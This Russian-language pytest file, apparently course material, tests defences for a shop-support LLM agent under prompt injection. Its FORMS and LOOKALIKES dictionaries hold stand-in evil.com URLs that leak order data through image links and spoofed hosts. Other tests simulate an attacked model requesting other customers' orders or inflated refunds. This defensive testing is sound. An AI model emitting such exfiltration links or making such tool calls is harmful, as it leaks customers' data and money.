"""Чекпоинт 3, урок 14a: фильтр ссылок в ответе, клиент из сессии, сумма возврата из кода.

Сначала заполните четыре функции урока 14a в checks/adapter.py. Запуск из корня проекта:
    pytest checks/test_injection_basics.py
Модель не вызывается: фильтр получает готовые ответы, инструменты получают вызовы, какие модель сделала бы под атакой.
Правило «недоверенный текст приходит результатом инструмента» тест не проверяет: его смотрят в коде на защите.
"""
import json
from types import SimpleNamespace
from urllib.parse import urlparse

import pytest

import adapter

# --- Правило 2. Фильтр ответа ------------------------------------------------------------------

BEFORE, AFTER = "Возврат 990 ₽ оформлен.", "Деньги придут в течение 5 рабочих дней."
EVIL = "https://evil.com/p.png?d=53110-33980"  # данные заказа уходят в адресе картинки
FORMS = {  # один и тот же чужой адрес в разной разметке: виджет загрузит или покажет любую
    "md-link": f"[подробнее]({EVIL})",
    "md-image": f"![]({EVIL})",
    "html-a": f'<a href="{EVIL}">подробнее</a>',
    "html-img": f'<img src="{EVIL}">',
    "bare-url": EVIL,
    "no-scheme": "![](//evil.com/p.png?d=53110-33980)",  # картинка без схемы: браузер сам допишет https:
}
LOOKALIKES = {  # похожие адреса: проверка подстрокой или концом имени их пропустит
    "subdomain": "https://{host}.evil.com/p.png",  # поддомен чужого хоста
    "in-path": "https://evil.com/{host}/p.png",  # хост магазина в пути
    "dashed": "https://{dashed}.com/p.png",  # дефис вместо точки
    "userinfo": "https://{host}@evil.com/p.png",  # до @ стоит логин, хост после него
    "prefix": "https://evil{host}/p.png",  # имя магазина с приставкой
}


@pytest.fixture(scope="module")
def host():
    try:
        hosts = adapter.allowed_hosts()
        adapter.filter_answer("")
    except NotImplementedError:
        pytest.skip("фильтр не подключён: допишите allowed_hosts и filter_answer в checks/adapter.py")
    assert hosts, "allowed_hosts() пуст: ответу некуда ссылаться, даже на страницу возврата"
    return sorted(hosts)[0]


def shown(link: str) -> str:
    """Ответ со ссылкой посередине после фильтра. Текст вокруг ссылки должен остаться."""
    out = adapter.filter_answer(f"{BEFORE} {link} {AFTER}")
    assert BEFORE in out and AFTER in out, f"фильтр испортил текст вокруг ссылки:\n{out}"
    return out


@pytest.mark.parametrize("form", ["{url}", "[страница возврата]({url})"], ids=["bare-url", "md-link"])
def test_allowed_link_stays(host, form):
    url = f"https://{host}/returns"
    out = shown(form.format(url=url))
    assert url in out, f"ссылка на {host} разрешена, а фильтр её вырезал:\n{out}"


@pytest.mark.parametrize("link", FORMS.values(), ids=FORMS.keys())
def test_foreign_link_removed(host, link):
    out = shown(link)
    assert "evil.com" not in out, f"ссылка на чужой хост осталась в ответе:\n{out}"


@pytest.mark.parametrize("pattern", LOOKALIKES.values(), ids=LOOKALIKES.keys())
def test_lookalike_host_removed(host, pattern):
    url = pattern.format(host=host, dashed=host.replace(".", "-"))
    bad = urlparse(url).hostname  # куда на самом деле пойдёт браузер
    out = shown(f"![]({url})")
    assert bad not in out, f"картинка с {bad} прошла фильтр: хост сравнивается целиком после разбора адреса\n{out}"


def test_backslash_removed(host):
    """urlparse видит в https://evil.com\\@shop.example хост магазина, а браузер читает \\ как / и идёт на evil.com."""
    out = shown(f"![](https://evil.com\\@{host}/p.png)")
    assert "evil.com" not in out, f"адрес с \\ прошёл фильтр: браузер пойдёт на evil.com, такие адреса вырезаются без разбора\n{out}"


def test_mixed_answer(host):
    """Чужая картинка не должна утянуть за собой разрешённую ссылку рядом."""
    url = f"https://{host}/returns"
    out = shown(f"Оформите возврат: {url} ![]({EVIL})")
    assert url in out, f"вместе с чужой картинкой пропала разрешённая ссылка:\n{out}"
    assert "evil.com" not in out, f"чужая картинка осталась:\n{out}"


def test_plain_answer_untouched(host):
    text = "Заказ 53110 получен 9 дней назад, вернуть его можно до 25.09 (ещё 5 дней). Сумма: 32 990 ₽!"
    assert adapter.filter_answer(text) == text, "ответ без ссылок фильтр менять не должен"


# --- Правило 3. Клиент из сессии, суммы из кода ------------------------------------------------
# 53110: робот-пылесос 32 990 и чехол 990, получен 9 дней назад. 48213: кофемолка 6500, списано дважды, оплачено 13 000.
# Заказы из CANDIDATES получены недавно: без проверки владельца возврат по ним прошёл бы.

OWN, OWN_ITEM, OWN_PRICE = 53110, "Чехол для телефона", 990
DOUBLE, DOUBLE_EXTRA = 48213, 6500
CANDIDATES = [49880, 52876, 50990, 53422]
MISSING = 99999


@pytest.fixture(scope="module")
def people():
    """Свой клиент, чужой заказ и его владелец. Кто чей, берётся из owner_of вашего проекта."""
    try:
        me = adapter.owner_of(OWN)
        adapter.session_tool(me, "get_order", {"order_id": OWN})
    except NotImplementedError:
        pytest.skip("права не подключены: допишите owner_of и session_tool в checks/adapter.py")
    assert me, f"owner_of({OWN}) вернул {me!r}: у заказа должен быть владелец"
    foreign = next((o for o in CANDIDATES if adapter.owner_of(o) not in (None, me)), None)
    assert foreign, f"все заказы {CANDIDATES} принадлежат {me} или никому: заведите второго клиента"
    return SimpleNamespace(me=me, foreign=foreign, stranger=adapter.owner_of(foreign))


@pytest.fixture
def st():
    tools = adapter.tools()
    tools.reset_state()  # каждый тест с эталонного состояния: заказы как в файле, возвратов нет
    return tools


def seen(result) -> str:
    """То, что увидит модель, одной строкой. JSON приводится к виду без экранирования кириллицы."""
    if isinstance(result, str):
        try:
            result = json.loads(result)
        except ValueError:
            return result
    return json.dumps(result, ensure_ascii=False, sort_keys=True)


def item_of(st, order_id: int) -> str:
    return st.ORDERS[order_id]["items"][0]["name"]


def refunded(st, order_id: int) -> int:
    return sum(r["amount_rub"] for r in st.REFUNDS if r["order_id"] == order_id)


def test_owner_reads_own_order(people, st):
    for customer, order_id in ((people.me, OWN), (people.stranger, people.foreign)):
        out = seen(adapter.session_tool(customer, "get_order", {"order_id": order_id}))
        assert item_of(st, order_id) in out, f"клиент {customer} не видит свой заказ {order_id}:\n{out}"


def test_foreign_order_looks_missing(people, st):
    foreign = seen(adapter.session_tool(people.me, "get_order", {"order_id": people.foreign}))
    missing = seen(adapter.session_tool(people.me, "get_order", {"order_id": MISSING}))
    assert item_of(st, people.foreign) not in foreign, f"{people.me} видит чужой заказ {people.foreign}:\n{foreign}"
    assert foreign.replace(str(people.foreign), "N") == missing.replace(str(MISSING), "N"), (
        "чужой заказ отвечает иначе, чем несуществующий: перебором номеров можно узнать, какие заказы есть\n"
        f"чужой {people.foreign}: {foreign}\nнесуществующий {MISSING}: {missing}")


@pytest.mark.parametrize("field", ["customer_id", "user_id"])
def test_customer_in_args_ignored(people, st, field):
    args = {"order_id": people.foreign, field: people.stranger}
    out = seen(adapter.session_tool(people.me, "get_order", args))
    assert item_of(st, people.foreign) not in out, (
        f"модель вписала {field}={people.stranger} и получила чужой заказ: клиент должен приходить из сессии\n{out}")


def test_legit_refund_goes_through(people, st):
    args = {"order_id": OWN, "item": OWN_ITEM, "reason": "не подошёл"}
    out = seen(adapter.session_tool(people.me, "refund_item", args))
    assert refunded(st, OWN) == OWN_PRICE, (
        f"законный возврат чехла за {OWN_PRICE} не записан в tools().REFUNDS: защита не должна мешать законному\n{out}")


@pytest.mark.parametrize("name, args, limit", [
    ("refund_item", {"order_id": OWN, "item": OWN_ITEM, "reason": "не подошёл", "amount_rub": 33980}, OWN_PRICE),
    ("refund_overpayment", {"order_id": DOUBLE, "reason": "списали дважды", "amount_rub": 13000}, DOUBLE_EXTRA),
], ids=["item-price", "overpayment"])
def test_amount_from_code(people, st, name, args, limit):
    customer = adapter.owner_of(args["order_id"])
    assert customer, f"owner_of({args['order_id']}) вернул {customer!r}: у заказа должен быть владелец"
    out = seen(adapter.session_tool(customer, name, args))
    got = refunded(st, args["order_id"])
    assert got <= limit, (
        f"модель назвала {args['amount_rub']}, записан возврат {got}, положено не больше {limit}: сумму считает код\n{out}")


@pytest.mark.parametrize("field", [None, "customer_id"], ids=["plain", "with-customer_id"])
def test_foreign_refund_not_recorded(people, st, field):
    args = {"order_id": people.foreign, "item": item_of(st, people.foreign), "reason": "не подошёл"}
    if field:
        args[field] = people.stranger
    out = seen(adapter.session_tool(people.me, "refund_item", args))
    assert refunded(st, people.foreign) == 0, (
        f"клиент {people.me} оформил возврат по чужому заказу {people.foreign}\n{out}")
